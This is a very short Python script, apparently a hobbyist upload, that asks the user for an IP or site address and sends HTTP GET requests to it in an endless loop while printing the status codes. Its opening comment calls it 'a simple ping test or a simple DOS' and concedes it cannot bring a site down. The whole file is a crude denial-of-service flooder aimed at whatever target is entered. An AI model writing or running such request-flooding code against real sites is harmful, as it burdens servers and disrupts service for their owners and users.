#Yes, i already know, is a simple ping test or a simple DOS | this code can't even server down a simple site

import requests

target = input("Paste an IP or a site address: ")

while True:
    r = requests.get(target)

    print("ping : " + str(r.status_code))
